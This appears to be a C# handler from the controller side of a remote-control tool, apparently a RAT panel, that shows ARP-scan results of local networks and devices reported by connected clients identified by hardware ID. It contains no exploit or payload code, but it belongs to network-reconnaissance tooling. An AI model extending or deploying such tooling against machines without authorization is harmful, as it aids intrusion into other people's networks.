using System.Windows.Forms;
using Leb128;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerArpScanner
{
	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 2 || !(objects[1] is string))
		{
			return;
		}
		switch ((string)objects[1])
		{
		case "Connect":
		{
			if (objects.Length < 3 || !(objects[2] is string))
			{
				break;
			}
			string hwid = SecurityHelper.SanitizeHwid((string)objects[2]);
			FormArpScanner form4 = (FormArpScanner)Application.OpenForms["ArpScanner:" + hwid];
			if (form4 == null)
			{
				client.Disconnect();
				break;
			}
			form4.Invoke((MethodInvoker)delegate
			{
				form4.Text = "Arp Scanner [" + hwid + "]";
				form4.client = client;
				form4.materialLabel1.Enabled = true;
				form4.dataGridView2.Enabled = true;
				form4.materialLabel1.Text = "Connected successfully";
				client.Send(LEB128.Write(new object[1] { "GetNetworks" }));
			});
			client.Tag = form4;
			client.Hwid = hwid;
			break;
		}
		case "List":
		{
			if (client.Tag == null)
			{
				break;
			}
			FormArpScanner form2 = (FormArpScanner)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.materialLabel1.Text = "Scan completed. Found " + (objects.Length - 2) / 4 + " devices.";
				form2.buttonScan.Enabled = true;
				form2.comboBoxNetworks.Enabled = true;
				int num = 2;
				while (num + 3 < objects.Length)
				{
					string value = (objects[num++] as string) ?? "Unknown";
					string value2 = (objects[num++] as string) ?? "Unknown";
					string value3 = (objects[num++] as string) ?? "Unknown";
					string value4 = (objects[num++] as string) ?? "Unknown";
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = value
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = value2
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = value3
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = value4
							}
						}
					};
					form2.dataGridView2.Rows.Add(dataGridViewRow);
				}
			});
			break;
		}
		case "Networks":
		{
			if (client.Tag == null)
			{
				break;
			}
			FormArpScanner form3 = (FormArpScanner)client.Tag;
			form3.Invoke((MethodInvoker)delegate
			{
				form3.comboBoxNetworks.Items.Clear();
				for (int i = 2; i < objects.Length; i++)
				{
					string text = objects[i] as string;
					if (!string.IsNullOrEmpty(text))
					{
						form3.comboBoxNetworks.Items.Add(text);
					}
				}
				if (form3.comboBoxNetworks.Items.Count > 0)
				{
					form3.comboBoxNetworks.SelectedIndex = 0;
					form3.comboBoxNetworks.Texts = form3.comboBoxNetworks.Items[0].ToString();
				}
				form3.materialLabel1.Text = "Networks loaded: " + form3.comboBoxNetworks.Items.Count;
			});
			break;
		}
		case "Error":
			if (client.Tag != null)
			{
				FormArpScanner form = (FormArpScanner)client.Tag;
				form.Invoke((MethodInvoker)delegate
				{
					form.materialLabel1.Text = "Error: " + (string)objects[2];
					form.buttonScan.Enabled = true;
					form.comboBoxNetworks.Enabled = true;
				});
			}
			break;
		}
	}
}
